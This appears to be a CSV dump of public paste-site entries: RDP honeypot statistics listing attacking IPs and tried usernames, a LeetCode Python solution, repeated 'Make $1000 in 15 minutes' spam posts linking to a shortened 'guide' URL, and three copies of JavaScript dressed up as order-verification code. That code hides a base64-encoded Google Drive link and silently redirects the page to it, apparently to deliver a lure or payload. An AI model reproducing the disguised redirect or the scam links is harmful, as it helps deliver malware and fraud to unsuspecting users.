id,title,username,language,date,content
J5p0gzym,2025-04-18_stats.json,rdp_snitch,JSON,Friday 18th of April 2025 07:18:23 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 7134,
    ""159.89.6.147"": 1155,
    ""71.82.170.60"": 42,
    ""211.185.207.14"": 51,
    ""167.94.138.114"": 3,
    ""103.165.79.69"": 3,
    ""194.165.17.21"": 27,
    ""80.94.95.198"": 27,
    ""205.210.31.174"": 9,
    ""157.245.104.150"": 3,
    ""185.242.226.23"": 3,
    ""104.234.11.112"": 3,
    ""194.165.16.166"": 6,
    ""91.238.181.94"": 6,
    ""205.210.31.246"": 9,
    ""185.147.124.177"": 9,
    ""80.94.95.90"": 9,
    ""160.250.247.11"": 3,
    ""198.235.24.57"": 9,
    ""194.164.161.184"": 3,
    ""45.227.254.130"": 9,
    ""103.129.215.14"": 6,
    ""198.235.24.208"": 9,
    ""194.165.16.165"": 6
  },
  ""asn"": {
    ""AS212238"": 7134,
    ""AS14061"": 1158,
    ""AS20115"": 42,
    ""AS4766"": 51,
    ""AS398324"": 3,
    ""AS17439"": 3,
    ""AS48721"": 39,
    ""AS204428"": 36,
    ""AS396982"": 36,
    ""AS202425"": 3,
    ""AS212477"": 3,
    ""AS49434"": 6,
    ""AS49505"": 9,
    ""AS135918"": 3,
    ""AS8560"": 3,
    ""AS267784"": 9,
    ""AS138192"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 7134,
    ""DigitalOcean, LLC"": 1158,
    ""Charter Communications"": 42,
    ""Korea Telecom"": 51,
    ""Censys, Inc."": 3,
    ""NTTCINS"": 3,
    ""Flyservers S.A."": 48,
    ""SS-Net"": 36,
    ""Google LLC"": 36,
    ""IP Volume inc"": 3,
    ""Internet Utilities NA LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""JSC Selectel"": 9,
    ""Viet Digital Technology Liability Company"": 3,
    ""IONOS SE"": 3,
    ""Speed"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 7134,
    ""DigitalOcean, LLC"": 1158,
    ""Spectrum"": 42,
    ""Kornet"": 51,
    ""Censys, Inc"": 3,
    ""Quick Microbooks Solution Private Limited"": 3,
    ""Flyservers S.A"": 39,
    ""Unmanaged LTD"": 36,
    ""Palo Alto Networks, Inc"": 36,
    ""AI Spera"": 3,
    ""Virtual Machine Solutions LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Tilda LLC"": 9,
    ""Golden Key Solutions LLC"": 3,
    ""IONOS SE"": 3,
    ""Xwin Universal LTD"": 9,
    ""Unknown"": 6
  },
  ""regionName"": {
    ""North West"": 7134,
    ""Hesse"": 1155,
    ""Wisconsin"": 42,
    ""Sejong-si"": 51,
    ""Michigan"": 3,
    ""National Capital Territory of Delhi"": 3,
    ""Kaunas"": 39,
    ""Budapest"": 36,
    ""California"": 36,
    ""Karnataka"": 3,
    ""North Holland"": 3,
    ""New Jersey"": 3,
    ""\u00cele-de-France"": 6,
    ""Moscow"": 9,
    ""\u0110\u1ed3ng Th\u00e1p Province"": 3,
    ""Madrid"": 3,
    ""Vilnius"": 9,
    ""Dhaka Division"": 6
  },
  ""country"": {
    ""Singapore"": 7134,
    ""Germany"": 1155,
    ""United States"": 84,
    ""South Korea"": 51,
    ""India"": 6,
    ""Lithuania"": 48,
    ""Hungary"": 36,
    ""The Netherlands"": 3,
    ""France"": 6,
    ""Russia"": 9,
    ""Vietnam"": 3,
    ""Spain"": 3,
    ""Bangladesh"": 6
  },
  ""account"": {
    ""hello"": 8304,
    ""142.93.8.59"": 147,
    ""(empty)"": 3,
    ""pfsVOxsXm"": 3,
    ""ktkPpC"": 3,
    ""yBAppd"": 3,
    ""nmap"": 3,
    ""Test"": 24,
    ""qCxirIyYv"": 3,
    ""DyGlfQ"": 3,
    ""ArDCAA"": 3,
    ""Domain"": 18,
    ""Administr"": 9,
    ""immYjcXOP"": 3,
    ""chExBs"": 3,
    ""qozZkJ"": 3,
    ""sLNuldwdJ"": 3,
    ""pYhEGP"": 3,
    ""ldTjAo"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8544
  },
  ""client_build"": {
    ""Unknown"": 8544
  },
  ""client_name"": {
    ""Unknown"": 8544
  },
  ""ip_type"": {
    ""hosting & proxy"": 7137,
    ""hosting"": 1212,
    ""Unknown"": 195
  }
}"
4DJrZNNK,Products.js,kammex,JavaScript,Friday 18th of April 2025 07:16:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29806/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DviFWPaB,2025-04-18_stats.json,rdp_snitch,JSON,Friday 18th of April 2025 07:16:07 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 4756,
    ""159.89.6.147"": 770,
    ""71.82.170.60"": 28,
    ""211.185.207.14"": 34,
    ""167.94.138.114"": 2,
    ""103.165.79.69"": 2,
    ""194.165.17.21"": 18,
    ""80.94.95.198"": 18,
    ""205.210.31.174"": 6,
    ""157.245.104.150"": 2,
    ""185.242.226.23"": 2,
    ""104.234.11.112"": 2,
    ""194.165.16.166"": 4,
    ""91.238.181.94"": 4,
    ""205.210.31.246"": 6,
    ""185.147.124.177"": 6,
    ""80.94.95.90"": 6,
    ""160.250.247.11"": 2,
    ""198.235.24.57"": 6,
    ""194.164.161.184"": 2,
    ""45.227.254.130"": 6,
    ""103.129.215.14"": 4,
    ""198.235.24.208"": 6,
    ""194.165.16.165"": 4
  },
  ""asn"": {
    ""AS212238"": 4756,
    ""AS14061"": 772,
    ""AS20115"": 28,
    ""AS4766"": 34,
    ""AS398324"": 2,
    ""AS17439"": 2,
    ""AS48721"": 26,
    ""AS204428"": 24,
    ""AS396982"": 24,
    ""AS202425"": 2,
    ""AS212477"": 2,
    ""AS49434"": 4,
    ""AS49505"": 6,
    ""AS135918"": 2,
    ""AS8560"": 2,
    ""AS267784"": 6,
    ""AS138192"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 4756,
    ""DigitalOcean, LLC"": 772,
    ""Charter Communications"": 28,
    ""Korea Telecom"": 34,
    ""Censys, Inc."": 2,
    ""NTTCINS"": 2,
    ""Flyservers S.A."": 32,
    ""SS-Net"": 24,
    ""Google LLC"": 24,
    ""IP Volume inc"": 2,
    ""Internet Utilities NA LLC"": 2,
    ""Datacenter location PAR1 France"": 4,
    ""JSC Selectel"": 6,
    ""Viet Digital Technology Liability Company"": 2,
    ""IONOS SE"": 2,
    ""Speed"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 4756,
    ""DigitalOcean, LLC"": 772,
    ""Spectrum"": 28,
    ""Kornet"": 34,
    ""Censys, Inc"": 2,
    ""Quick Microbooks Solution Private Limited"": 2,
    ""Flyservers S.A"": 26,
    ""Unmanaged LTD"": 24,
    ""Palo Alto Networks, Inc"": 24,
    ""AI Spera"": 2,
    ""Virtual Machine Solutions LLC"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Tilda LLC"": 6,
    ""Golden Key Solutions LLC"": 2,
    ""IONOS SE"": 2,
    ""Xwin Universal LTD"": 6,
    ""Unknown"": 4
  },
  ""regionName"": {
    ""North West"": 4756,
    ""Hesse"": 770,
    ""Wisconsin"": 28,
    ""Sejong-si"": 34,
    ""Michigan"": 2,
    ""National Capital Territory of Delhi"": 2,
    ""Kaunas"": 26,
    ""Budapest"": 24,
    ""California"": 24,
    ""Karnataka"": 2,
    ""North Holland"": 2,
    ""New Jersey"": 2,
    ""\u00cele-de-France"": 4,
    ""Moscow"": 6,
    ""\u0110\u1ed3ng Th\u00e1p Province"": 2,
    ""Madrid"": 2,
    ""Vilnius"": 6,
    ""Dhaka Division"": 4
  },
  ""country"": {
    ""Singapore"": 4756,
    ""Germany"": 770,
    ""United States"": 56,
    ""South Korea"": 34,
    ""India"": 4,
    ""Lithuania"": 32,
    ""Hungary"": 24,
    ""The Netherlands"": 2,
    ""France"": 4,
    ""Russia"": 6,
    ""Vietnam"": 2,
    ""Spain"": 2,
    ""Bangladesh"": 4
  },
  ""account"": {
    ""hello"": 5536,
    ""142.93.8.59"": 98,
    ""(empty)"": 2,
    ""pfsVOxsXm"": 2,
    ""ktkPpC"": 2,
    ""yBAppd"": 2,
    ""nmap"": 2,
    ""Test"": 16,
    ""qCxirIyYv"": 2,
    ""DyGlfQ"": 2,
    ""ArDCAA"": 2,
    ""Domain"": 12,
    ""Administr"": 6,
    ""immYjcXOP"": 2,
    ""chExBs"": 2,
    ""qozZkJ"": 2,
    ""sLNuldwdJ"": 2,
    ""pYhEGP"": 2,
    ""ldTjAo"": 2
  },
  ""keyboard"": {
    ""Unknown"": 5696
  },
  ""client_build"": {
    ""Unknown"": 5696
  },
  ""client_name"": {
    ""Unknown"": 5696
  },
  ""ip_type"": {
    ""hosting & proxy"": 4758,
    ""hosting"": 808,
    ""Unknown"": 130
  }
}"
teZvaFeR,Make $1000 15-MINUTES (BEGINNER) 2J,Pitrs7_cz,JavaScript,Friday 18th of April 2025 07:15:28 PM CDT," 
Pdf https://tinyurl.com/privguidee


viYrrUQLD5
"
RcyvNnmF,2025-04-18_stats.json,rdp_snitch,JSON,Friday 18th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 2378,
    ""159.89.6.147"": 385,
    ""71.82.170.60"": 14,
    ""211.185.207.14"": 17,
    ""167.94.138.114"": 1,
    ""103.165.79.69"": 1,
    ""194.165.17.21"": 9,
    ""80.94.95.198"": 9,
    ""205.210.31.174"": 3,
    ""157.245.104.150"": 1,
    ""185.242.226.23"": 1,
    ""104.234.11.112"": 1,
    ""194.165.16.166"": 2,
    ""91.238.181.94"": 2,
    ""205.210.31.246"": 3,
    ""185.147.124.177"": 3,
    ""80.94.95.90"": 3,
    ""160.250.247.11"": 1,
    ""198.235.24.57"": 3,
    ""194.164.161.184"": 1,
    ""45.227.254.130"": 3,
    ""103.129.215.14"": 2,
    ""198.235.24.208"": 3,
    ""194.165.16.165"": 2
  },
  ""asn"": {
    ""AS212238"": 2378,
    ""AS14061"": 386,
    ""AS20115"": 14,
    ""AS4766"": 17,
    ""AS398324"": 1,
    ""AS17439"": 1,
    ""AS48721"": 13,
    ""AS204428"": 12,
    ""AS396982"": 12,
    ""AS202425"": 1,
    ""AS212477"": 1,
    ""AS49434"": 2,
    ""AS49505"": 3,
    ""AS135918"": 1,
    ""AS8560"": 1,
    ""AS267784"": 3,
    ""AS138192"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 2378,
    ""DigitalOcean, LLC"": 386,
    ""Charter Communications"": 14,
    ""Korea Telecom"": 17,
    ""Censys, Inc."": 1,
    ""NTTCINS"": 1,
    ""Flyservers S.A."": 16,
    ""SS-Net"": 12,
    ""Google LLC"": 12,
    ""IP Volume inc"": 1,
    ""Internet Utilities NA LLC"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""JSC Selectel"": 3,
    ""Viet Digital Technology Liability Company"": 1,
    ""IONOS SE"": 1,
    ""Speed"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 2378,
    ""DigitalOcean, LLC"": 386,
    ""Spectrum"": 14,
    ""Kornet"": 17,
    ""Censys, Inc"": 1,
    ""Quick Microbooks Solution Private Limited"": 1,
    ""Flyservers S.A"": 13,
    ""Unmanaged LTD"": 12,
    ""Palo Alto Networks, Inc"": 12,
    ""AI Spera"": 1,
    ""Virtual Machine Solutions LLC"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Tilda LLC"": 3,
    ""Golden Key Solutions LLC"": 1,
    ""IONOS SE"": 1,
    ""Xwin Universal LTD"": 3,
    ""Unknown"": 2
  },
  ""regionName"": {
    ""North West"": 2378,
    ""Hesse"": 385,
    ""Wisconsin"": 14,
    ""Sejong-si"": 17,
    ""Michigan"": 1,
    ""National Capital Territory of Delhi"": 1,
    ""Kaunas"": 13,
    ""Budapest"": 12,
    ""California"": 12,
    ""Karnataka"": 1,
    ""North Holland"": 1,
    ""New Jersey"": 1,
    ""\u00cele-de-France"": 2,
    ""Moscow"": 3,
    ""\u0110\u1ed3ng Th\u00e1p Province"": 1,
    ""Madrid"": 1,
    ""Vilnius"": 3,
    ""Dhaka Division"": 2
  },
  ""country"": {
    ""Singapore"": 2378,
    ""Germany"": 385,
    ""United States"": 28,
    ""South Korea"": 17,
    ""India"": 2,
    ""Lithuania"": 16,
    ""Hungary"": 12,
    ""The Netherlands"": 1,
    ""France"": 2,
    ""Russia"": 3,
    ""Vietnam"": 1,
    ""Spain"": 1,
    ""Bangladesh"": 2
  },
  ""account"": {
    ""hello"": 2768,
    ""142.93.8.59"": 49,
    ""(empty)"": 1,
    ""pfsVOxsXm"": 1,
    ""ktkPpC"": 1,
    ""yBAppd"": 1,
    ""nmap"": 1,
    ""Test"": 8,
    ""qCxirIyYv"": 1,
    ""DyGlfQ"": 1,
    ""ArDCAA"": 1,
    ""Domain"": 6,
    ""Administr"": 3,
    ""immYjcXOP"": 1,
    ""chExBs"": 1,
    ""qozZkJ"": 1,
    ""sLNuldwdJ"": 1,
    ""pYhEGP"": 1,
    ""ldTjAo"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2848
  },
  ""client_build"": {
    ""Unknown"": 2848
  },
  ""client_name"": {
    ""Unknown"": 2848
  },
  ""ip_type"": {
    ""hosting & proxy"": 2379,
    ""hosting"": 404,
    ""Unknown"": 65
  }
}"
DjJFx6VE,EARN $900 INSTANTLY 2025⭐ 8F,Pitrs7_cz,JavaScript,Friday 18th of April 2025 07:01:36 PM CDT," 
Pdf https://tinyurl.com/privguidee


nEW8Y6ARJS
"
C43u9QKg,Order.js,kammex,JavaScript,Friday 18th of April 2025 07:01:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18554/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bPTjvVxZ,Buildings with an ocean view,smj007,Python,Friday 18th of April 2025 06:53:58 PM CDT,"""""""
Going from right to left
""""""
class Solution:
    def findBuildings(self, heights: List[int]) -> List[int]:

        # tranverse from right to left
        index = len(heights)-1
        greatest_till_now = heights[-1]
        can_view = [len(heights)-1]

        for index in range(len(heights)-2, -1, -1):
            if heights[index] > greatest_till_now:
                greatest_till_now = heights[index]
                can_view.append(index)

        return  can_view[::-1]

""""""
Going from left to right. Pop all previous buildings from the stack 
if they are shorter or equal to the current one (because they can no longer see the ocean).

Push the current building’s index onto the stack.
""""""
class Solution:
    def findBuildings(self, heights: List[int]) -> List[int]:
        
        stack = []
        for i in range(len(heights)):
            # Pop all previous buildings from the stack 
            # if they are shorter or equal to the current one  
            while stack and heights[stack[-1]] <= heights[i]:
                stack.pop()
            stack.append(i)

        return stack
"
tUZxm4zQ,Make $1000 15-MINUTES  (BEGINNER) HA,Pitrs7_cz,JavaScript,Friday 18th of April 2025 06:48:10 PM CDT," 
Pdf https://tinyurl.com/privguidee


u6bal4XXVd
"
kvHbAW79,Market.js,kammex,JavaScript,Friday 18th of April 2025 06:45:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
